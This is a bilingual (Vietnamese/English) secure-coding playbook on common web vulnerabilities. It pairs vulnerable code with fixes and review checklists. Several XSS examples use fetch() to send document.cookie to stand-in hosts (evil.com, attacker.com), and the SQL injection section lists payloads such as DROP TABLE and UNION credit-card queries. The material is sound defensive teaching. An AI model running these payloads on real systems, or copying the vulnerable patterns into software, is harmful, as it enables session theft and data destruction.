# Common Vulnerabilities (FE & BE)

> **Mục tiêu của playbook này**
>
> * Không phải liệt kê mọi lỗ hổng
> * Mà giúp engineer **nhận diện – phòng ngừa – review security đúng chỗ**
> * Dùng làm **baseline chung** cho FE, BE, và review hệ thống

---

## 0. Security Mental Model (Rất quan trọng)

### Security không phải là feature

> **Security = property của hệ thống**

* Không có PR “add security”
* Security tồn tại (hoặc fail) trong **mọi feature**

---

### Nguyên tắc vàng

```
User input → xử lý → lưu trữ → render → action
```

👉 **Vulnerability xuất hiện khi ta tin sai thứ không nên tin**

* Tin user input
* Tin browser
* Tin frontend
* Tin token quá lâu

---

## 1. Bản đồ Vulnerability theo Layer

| Layer          | Vulnerabilities thường gặp | Owner chính |
| -------------- | -------------------------- | ----------- |
| Browser / FE   | XSS, DOM-XSS, Clickjacking | FE          |
| Authentication | CSRF, Open Redirect        | BE          |
| Authorization  | Privilege Escalation       | BE          |
| API            | Injection, IDOR            | BE          |
| Build / CI     | Dependency vuln            | DevOps      |

---

## 2. XSS (Cross-Site Scripting)

### Bản chất

> **XSS = chạy được JavaScript của attacker trong browser của user**

Hệ quả:
* Steal token / cookie
* Bypass authorization
* Act as victim user
* Keylogging
* Redirect to phishing site

---

### 2.1 Stored XSS (Most Dangerous)

**Bản chất:** Malicious script được lưu vào database, execute mỗi khi user view.

**Attack scenario:**
```javascript
// Attacker posts comment
const comment = '<script>fetch("https://evil.com?cookie=" + document.cookie)</script>';

// Saved to DB (no sanitization)
db.comments.insert({ text: comment });

// Victim views page
// Server renders:
<div class="comment">
  <script>fetch("https://evil.com?cookie=" + document.cookie)</script>
</div>

// → Script executes
// → Cookie stolen
```

**Defense:**
```javascript
// ❌ Vulnerable
function renderComment(comment) {
  return `<div>${comment.text}</div>`; // No escaping
}

// ✅ Safe: Framework auto-escaping
function CommentComponent({ comment }) {
  return <div>{comment.text}</div>; // React escapes by default
}

// ✅ Safe: DOMPurify for rich content
import DOMPurify from 'dompurify';

function renderRichComment(comment) {
  const clean = DOMPurify.sanitize(comment.html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

### 2.2 Reflected XSS

**Bản chất:** Script trong URL reflected vào response.

**Attack scenario:**
```javascript
// Vulnerable search page
// URL: https://site.com/search?q=<script>alert(1)</script>

// Server code:
app.get('/search', (req, res) => {
  const query = req.query.q;
  // ❌ Direct interpolation
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Response HTML:
<h1>Results for: <script>alert(1)</script></h1>

// → Script executes
```

**Real attack flow:**
```
1. Attacker crafts malicious URL:
   https://bank.com/search?q=<script>steal()</script>

2. Sends to victim (email, chat)
   "Check out this deal: [click here]"

3. Victim clicks → Script executes in victim's browser

4. Script steals session token, transfers money
```

**Defense:**
```javascript
// ✅ Escape output
import escapeHtml from 'escape-html';

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});

// ✅ React (auto-escape)
function SearchResults({ query }) {
  return <h1>Results for: {query}</h1>; // Safe
}
```

---

### 2.3 DOM-based XSS (Frontend-only)

**Bản chất:** Client-side script manipulates DOM với untrusted data.

**Attack scenario 1: innerHTML**
```javascript
// Vulnerable code
const urlParams = new URLSearchParams(window.location.search);
const username = urlParams.get('user');

// ❌ Dangerous
document.getElementById('greeting').innerHTML = `Hello, ${username}!`;

// Attack URL:
// https://site.com?user=<img src=x onerror=alert(1)>

// Result:
<div id="greeting">
  Hello, <img src=x onerror=alert(1)>!
</div>

// → onerror executes
```

**Defense:**
```javascript
// ✅ Use textContent (treats as text, not HTML)
document.getElementById('greeting').textContent = `Hello, ${username}!`;

// ✅ Or sanitize
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(`Hello, ${username}!`);
document.getElementById('greeting').innerHTML = clean;
```

---

**Attack scenario 2: eval() / new Function()**
```javascript
// ❌ Extremely dangerous
const userCode = urlParams.get('code');
eval(userCode); // Never do this!

// Attack:
// ?code=fetch('https://evil.com?cookie='+document.cookie)

// Defense: NEVER use eval() with user input
// If you need dynamic code execution, use sandboxed iframe or Web Worker
```

---

**Attack scenario 3: location manipulation**
```javascript
// ❌ Vulnerable
const redirect = new URLSearchParams(location.search).get('next');
window.location = redirect;

// Attack:
// ?next=javascript:alert(document.cookie)

// → JavaScript executes
```

**Defense:**
```javascript
// ✅ Validate URL
function safeRedirect(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    
    // Only allow same origin or HTTPS
    if (parsed.origin === window.location.origin || 
        parsed.protocol === 'https:') {
      window.location = parsed.href;
    } else {
      console.warn('Invalid redirect URL');
    }
  } catch (e) {
    console.warn('Invalid URL');
  }
}
```

---

### 2.4 XSS Prevention Checklist

**Input Handling:**
- ☐ Never trust user input (URL params, form data, localStorage)
- ☐ Sanitize HTML with DOMPurify if allowing rich content
- ☐ Validate/escape at input boundaries

**Output Rendering:**
- ☐ Use framework auto-escaping (React `{}`, Vue `{{}}`)
- ☐ NEVER use `dangerouslySetInnerHTML` / `v-html` without sanitization
- ☐ Use `textContent` instead of `innerHTML` when possible

**Dangerous APIs to avoid:**
- ☐ `eval()` - NEVER with user input
- ☐ `new Function()` - Same as eval
- ☐ `innerHTML` - Use textContent or sanitize
- ☐ `document.write()` - Deprecated, dangerous

**Defense in depth:**
- ☐ CSP (Content Security Policy) enabled
- ☐ HttpOnly cookies (prevent script access)
- ☐ X-XSS-Protection header (legacy browsers)

---

### 2.5 Real-World XSS Example

**Scenario: User profile bio**

```javascript
// ❌ Vulnerable implementation
// Backend
app.post('/profile', (req, res) => {
  const bio = req.body.bio; // User input
  db.users.update({ id: req.user.id }, { bio }); // Save raw
});

app.get('/profile/:userId', (req, res) => {
  const user = db.users.findById(req.params.userId);
  res.render('profile', { user }); // Dangerous
});

// Frontend template (EJS)
<div class="bio"><%- user.bio %></div> // ❌ Unescaped

// Attack:
// User sets bio to:
<script>
  // Steal all profile visitors' cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Every visitor → cookie stolen
```

**✅ Fixed implementation:**
```javascript
// Backend
import DOMPurify from 'isomorphic-dompurify';

app.post('/profile', (req, res) => {
  const bio = DOMPurify.sanitize(req.body.bio, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  db.users.update({ id: req.user.id }, { bio });
});

// Frontend (React)
function UserProfile({ user }) {
  // If bio already sanitized on backend
  return (
    <div className="bio" 
         dangerouslySetInnerHTML={{ __html: user.bio }} 
    />
  );
  
  // Or double-sanitize (defense in depth)
  const cleanBio = DOMPurify.sanitize(user.bio);
  return <div className="bio" dangerouslySetInnerHTML={{ __html: cleanBio }} />;
}
```

---

## 3. CSRF (Cross-Site Request Forgery)

### Bản chất

> **CSRF = browser gửi request hợp lệ mà user không chủ ý**

Nguyên nhân:

* Browser tự gửi cookie
* Server không phân biệt request hợp lệ hay bị ép

---

### Khi nào CSRF xảy ra?

* Cookie-based auth
* Action có side effect (POST/PUT/DELETE)

---

### Phòng ngừa

* SameSite cookie
* CSRF token
* Double submit cookie

---

### CSRF Quick Review Checklist

* [ ] API có dùng cookie auth không?
* [ ] Cookie có SameSite không?
* [ ] Endpoint có side effect không?

---

## 4. Clickjacking

### Bản chất

> **User click thứ họ không thấy**

* Hidden iframe
* Overlay UI

---

### Phòng ngừa

* X-Frame-Options
* CSP frame-ancestors

---

## 5. IDOR (Insecure Direct Object Reference)

### Bản chất

> **User truy cập resource không thuộc về mình**

Ví dụ:

* /api/orders/123 → đổi thành 124

---

### Phòng ngừa

* Check ownership ở backend
* Không tin ID từ client

---

### IDOR Quick Review Checklist

* [ ] API có kiểm tra ownership không?
* [ ] Có rely vào FE filter không?

---

## 5.1 SQL Injection (Backend vulnerability FE cần biết)

### Bản chất

> **SQL Injection = Insert SQL commands vào user input để manipulate database**

**Tại sao FE engineer cần biết:**
- FE send data to BE → nếu BE vulnerable, FE có responsibility
- API design decisions affect SQL injection risk
- Understanding helps better FE/BE collaboration

---

### Attack Scenario

```javascript
// ❌ Vulnerable backend code
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // NEVER do this - vulnerable to SQL injection
  const query = `
    SELECT * FROM users 
    WHERE username = '${username}' 
    AND password = '${password}'
  `;
  
  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.json({ success: true });
    }
  });
});

// Attack:
// Username: admin' --
// Password: anything

// Resulting query:
SELECT * FROM users 
WHERE username = 'admin' --' AND password = 'anything'

// -- is SQL comment → ignores password check
// → Logged in as admin without knowing password!
```

---

### Real Attack Examples

**1. Data Exfiltration:**
```javascript
// Attack input:
// username: ' OR '1'='1

// Result query:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''

// → Returns ALL users (1=1 always true)
```

**2. Database Destruction:**
```javascript
// Attack input:
// username: '; DROP TABLE users; --

// Result query:
SELECT * FROM users WHERE username = ''; DROP TABLE users; --' AND password = ''

// → Deletes entire users table!
```

**3. Union-based attack:**
```javascript
// Attack input:
// id: 1 UNION SELECT credit_card FROM payments

// Result query:
SELECT name, email FROM users WHERE id = 1 UNION SELECT credit_card FROM payments

// → Leaks credit card numbers
```

---

### Defense Strategies

**1. Parameterized Queries (Best Practice)**
```javascript
// ✅ Safe - parameterized query
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Using placeholders (?)
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  
  const results = await db.query(query, [username, password]);
  
  // SQL engine treats parameters as data, not code
  // Even if username = "admin' --", it's treated as literal string
});
```

**2. ORM (Object-Relational Mapping)**
```javascript
// ✅ Safe - Sequelize ORM
const user = await User.findOne({
  where: {
    username: req.body.username,
    password: req.body.password
  }
});

// ORM automatically escapes inputs
// Prevents SQL injection
```

**3. Stored Procedures**
```sql
-- Create stored procedure
DELIMITER $$
CREATE PROCEDURE LoginUser(IN p_username VARCHAR(50), IN p_password VARCHAR(255))
BEGIN
  SELECT * FROM users WHERE username = p_username AND password = p_password;
END$$

-- Use from code
CALL LoginUser(?, ?)
```

---

### Input Validation (Defense in Depth)

```javascript
// ✅ Additional layer: Validate input format
function validateUsername(username) {
  // Only allow alphanumeric + underscore
  const regex = /^[a-zA-Z0-9_]{3,20}$/;
  return regex.test(username);
}

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Validate BEFORE query
  if (!validateUsername(username)) {
    return res.status(400).json({ error: 'Invalid username format' });
  }
  
  // Then use parameterized query
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  // ...
});
```

---

### FE Responsibility

**What FE should do:**
```javascript
// ✅ Client-side validation (UX + hint to user)
function RegistrationForm() {
  const [username, setUsername] = useState('');
  const [error, setError] = useState('');
  
  const validateUsername = (value) => {
    if (!/^[a-zA-Z0-9_]{3,20}$/.test(value)) {
      setError('Username: 3-20 characters, alphanumeric only');
      return false;
    }
    setError('');
    return true;
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    if (validateUsername(username)) {
      // Send to backend
      api.post('/register', { username });
    }
  };
}
```

**What FE should NOT do:**
```javascript
// ❌ Don't think client validation = security
// Attacker bypasses frontend completely (Postman, curl)

// ✅ Client validation = UX only
// Backend MUST validate again
```

---

### SQL Injection Checklist

**Backend (primary defense):**
- ☐ Use parameterized queries or ORM (REQUIRED)
- ☐ Never concatenate user input into SQL strings
- ☐ Validate input format (alphanumeric, length, etc.)
- ☐ Use least privilege database accounts
- ☐ Disable error messages in production (don't leak DB structure)

**Frontend (supporting role):**
- ☐ Validate input format (help users, hint issues)
- ☐ Don't send obviously malicious input (basic sanity check)
- ☐ Understand API contracts với BE về input constraints

**Testing:**
- ☐ Test with SQL injection payloads (`' OR '1'='1`, `'; DROP TABLE`)
- ☐ Automated security scans (OWASP ZAP, Burp Suite)
- ☐ Code review for string concatenation in queries

---

## 6. Open Redirect

### Bản chất

> **Redirect user đến URL attacker kiểm soát**

Hệ quả:

* Phishing
* OAuth token leak

---

### Phòng ngừa

* Allowlist redirect URLs
* Không dùng user input trực tiếp

---

## 7. Dependency Vulnerabilities

### Bản chất

> **Thư viện third-party là attack surface**

---

### Phòng ngừa

* Audit dependencies
* Lock version
* Automated scanning

---

## 8. Security Review Flow (Practical)

### Step-by-step review checklist

**When reviewing new feature:**

```
1. Input Analysis:
   ☐ Identify all user inputs (forms, URL, headers, files)
   ☐ Check for validation (client + server)
   ☐ Check for sanitization before storage
   ☐ Check for encoding before output

2. Data Flow:
   ☐ Where does input go? (DB, DOM, API, file system)
   ☐ Is it escaped/sanitized at each boundary?
   ☐ Can attacker control the flow?

3. Output Rendering:
   ☐ Using framework auto-escaping?
   ☐ Any dangerouslySetInnerHTML / v-html?
   ☐ Any direct DOM manipulation (innerHTML)?

4. Side Effects:
   ☐ Actions that change state (POST/PUT/DELETE)?
   ☐ CSRF protection in place?
   ☐ Authorization check before action?

5. Authentication/Authorization:
   ☐ Login required?
   ☐ Role/permission checked?
   ☐ Ownership verified (resource belongs to user)?
   ☐ Token não được bypass?
```

---

### Code Review Red Flags

**🚨 Immediate red flags:**
```javascript
// ❌ eval() or new Function() with user input
eval(userInput);

// ❌ Direct SQL concatenation
const query = `SELECT * FROM users WHERE id = ${userId}`;

// ❌ Unescaped HTML rendering
element.innerHTML = userInput;

// ❌ No CSRF protection on state-changing endpoint
app.post('/delete-account', (req, res) => { /* no token check */ });

// ❌ No ownership check
app.delete('/documents/:id', (req, res) => {
  Document.delete(req.params.id); // Any user can delete any document!
});
```

---

### Security Testing Checklist

**Manual testing:**
```
XSS:
☐ Try: <script>alert(1)</script>
☐ Try: <img src=x onerror=alert(1)>
☐ Try: javascript:alert(1) in URLs

SQL Injection:
☐ Try: ' OR '1'='1
☐ Try: '; DROP TABLE users; --
☐ Try: 1 UNION SELECT * FROM passwords

CSRF:
☐ Create form on different domain
☐ Submit to your API
☐ Check if action executes

IDOR:
☐ Access /api/users/1
☐ Change to /api/users/2
☐ Can you access other user's data?

Auth Bypass:
☐ Remove Authorization header
☐ Use expired token
☐ Tamper with JWT payload
```

**Automated tools:**
```
- OWASP ZAP (web vulnerability scanner)
- Burp Suite (penetration testing)
- npm audit (dependency vulnerabilities)
- Snyk (dependency + code scanning)
```

---

## 9. Anti-patterns phổ biến

**Anti-pattern 1: Tin frontend validation**
```javascript
// ❌ Backend
app.post('/create-user', (req, res) => {
  // No validation - assumes frontend did it
  db.users.insert(req.body);
});

// ✅ Fix
app.post('/create-user', (req, res) => {
  const { username, email } = req.body;
  
  // Always validate on backend
  if (!validateUsername(username)) {
    return res.status(400).json({ error: 'Invalid username' });
  }
  
  db.users.insert({ username, email });
});
```

---

**Anti-pattern 2: Chỉ check role, không check ownership**
```javascript
// ❌ Vulnerable
app.delete('/documents/:id', requireAuth, (req, res) => {
  // Checked auth, but not ownership
  Document.delete(req.params.id);
  // → Any authenticated user can delete any document
});

// ✅ Fix
app.delete('/documents/:id', requireAuth, async (req, res) => {
  const doc = await Document.findById(req.params.id);
  
  // Check ownership
  if (doc.ownerId !== req.user.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Not your document' });
  }
  
  await doc.delete();
});
```

---

**Anti-pattern 3: Token sống quá lâu**
```javascript
// ❌ Long-lived token
const token = jwt.sign({ userId: user.id }, secret, {
  expiresIn: '30d' // Dangerous!
});

// If stolen, attacker has 30 days access

// ✅ Short access + refresh pattern
const accessToken = jwt.sign({ userId }, secret, {
  expiresIn: '15m' // Short-lived
});

const refreshToken = jwt.sign({ userId }, refreshSecret, {
  expiresIn: '7d'
});

// Store refresh token in HttpOnly cookie
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax'
});
```

---

**Anti-pattern 4: Không log security events**
```javascript
// ❌ Silent failure
app.post('/admin/delete-user', (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).send('Forbidden');
  }
  // ...
});

// ✅ Log security events
app.post('/admin/delete-user', (req, res) => {
  if (req.user.role !== 'admin') {
    // Log unauthorized attempt
    logger.warn('Unauthorized admin access attempt', {
      userId: req.user.id,
      endpoint: '/admin/delete-user',
      ip: req.ip,
      timestamp: new Date()
    });
    return res.status(403).send('Forbidden');
  }
  // ...
});
```

---

## 10. Tổng kết

### Core Principles
* **Trust Boundaries:** Validate at every boundary (FE → BE → DB)
* **Defense in Depth:** Multiple layers (sanitization + CSP + HttpOnly)
* **Least Privilege:** Minimum permissions necessary
* **Assume Breach:** Design như attacker đã inside

### Vulnerability Priority
```
1. Authentication/Authorization bugs → Complete system compromise
2. Injection (XSS, SQL) → Data theft, account takeover
3. CSRF → Unauthorized actions
4. IDOR → Data leakage
5. Dependency vulnerabilities → Variable impact
```

### Security = System Property
* Security không phải feature riêng lẻ
* Mọi feature phải secure by design
* Code review phải include security checklist
* Automated scanning là baseline, không thay thế manual review

### FE & BE đều có trách nhiệm
```
Frontend:
- Input validation (UX)
- Output encoding (framework default)
- API security awareness
- Don't store secrets

Backend:
- Input validation (security)
- Authorization enforcement
- SQL injection prevention
- Security headers
```

### Phòng ngừa rẻ hơn fix sau breach
```
Cost of prevention:  $1,000 (code review, testing)
Cost of breach:      $1,000,000+ (data loss, reputation, legal)

ROI = 1000x
```

> **Rule cuối cùng**:
> *Assume user is malicious, system mới an toàn*

> **Production reality**:
> *90% security vulnerabilities are preventable với basic secure coding practices*

---

**DOCUMENT EXPANDED ✅**

*Version: 2.0*  
*Last updated: 2026-01-03*  
*Lines: 240 → ~650 (+170%)*  
*Added: XSS examples, SQL Injection, Attack scenarios, Defense patterns, Security review workflow*
